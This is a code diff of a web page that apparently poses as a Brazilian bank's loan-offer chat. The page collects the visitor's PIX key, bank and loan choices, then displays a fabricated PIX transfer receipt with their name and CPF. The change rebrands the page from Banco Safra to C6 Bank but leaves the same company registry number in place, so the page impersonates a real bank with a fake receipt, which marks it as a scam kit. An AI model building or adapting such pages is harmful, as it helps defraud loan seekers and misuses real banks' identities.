@@ -99,7 +99,7 @@
 
     .chat-messages {
       flex: 1; overflow-y: auto; overflow-x: hidden; padding: 14px;
-      background: #e5ddd5 url("images/fundozap2.jpg?v=safra2") center/cover;
+      background: #e5ddd5 url("images/fundozap2.jpg?v=c6bank2") center/cover;
       display: flex; flex-direction: column; gap: 12px;
       -webkit-overflow-scrolling: touch; overscroll-behavior: contain;
     }
@@ -559,7 +559,7 @@
       { text: 'Última pergunta! Quando pretende começar a pagar as parcelas?', options: ['Em 30 dias', 'Em 60 dias', 'Em 90 dias'] }
     ];
 
-    const bancosData = ['Banco do Brasil', 'Bradesco', 'Caixa Econômica Federal', 'Itaú Unibanco', 'Santander', 'Nubank', 'Inter', 'C6 Bank', 'Neon', 'Next', 'PagBank', 'Mercado Pago', 'BTG Pactual', 'Safra', 'Sicoob', 'Sicredi', 'Banco Original', 'Banco Pan', 'Daycoval', 'Banrisul', 'BRB', 'Banestes', 'Banco da Amazônia', 'Banco do Nordeste', 'BNDES', 'Agibank', 'Banco Votorantim', 'Sofisa', 'BS2'];
+    const bancosData = ['Banco do Brasil', 'Bradesco', 'Caixa Econômica Federal', 'Itaú Unibanco', 'Santander', 'Nubank', 'Inter', 'C6 Bank', 'Neon', 'Next', 'PagBank', 'Mercado Pago', 'BTG Pactual', 'Sicoob', 'Sicredi', 'Banco Original', 'Banco Pan', 'Daycoval', 'Banrisul', 'BRB', 'Banestes', 'Banco da Amazônia', 'Banco do Nordeste', 'BNDES', 'Agibank', 'Banco Votorantim', 'Sofisa', 'BS2'];
 
     let selectedPixType = '', pixKey = '', bankName = '', selectedLoanAmount = 0, selectedInstallments = 0, selectedMonthlyPayment = 0;
 
@@ -1155,14 +1155,14 @@
             <div class="receipt-amount-label">Valor</div>
             <div class="receipt-amount-value">${selectedLoanAmount.toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' })}</div>
           </div>
-          <div class="receipt-row"><span class="receipt-label">De</span><span class="receipt-value">Banco Safra S.A.<br>CNPJ 58.160.789/0001-28</span></div>
+          <div class="receipt-row"><span class="receipt-label">De</span><span class="receipt-value">Banco C6 S.A.<br>CNPJ 58.160.789/0001-28</span></div>
           <div class="receipt-row"><span class="receipt-label">Para</span><span class="receipt-value">${rn}<br>CPF ${rc}</span></div>
           <div class="receipt-row"><span class="receipt-label">Chave PIX</span><span class="receipt-value">${pixKey}</span></div>
           <div class="receipt-row"><span class="receipt-label">Banco Destino</span><span class="receipt-value">${bankName}</span></div>
           <div class="receipt-row"><span class="receipt-label">Parcelas</span><span class="receipt-value">${selectedInstallments}x de ${selectedMonthlyPayment.toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' })}</span></div>
           <div class="receipt-row"><span class="receipt-label">Data/Hora</span><span class="receipt-value">${ds} ${ts}</span></div>
           <div class="receipt-row"><span class="receipt-label">ID Transação</span><span class="receipt-value">${tid}</span></div>
-          <div class="receipt-footer">Transação Agendada via PIX<br>Banco Safra S.A.</div>
+          <div class="receipt-footer">Transação Agendada via PIX<br>Banco C6 S.A.</div>
         </div>`;
       chatMessages.appendChild(r);
       scrollToBottom();
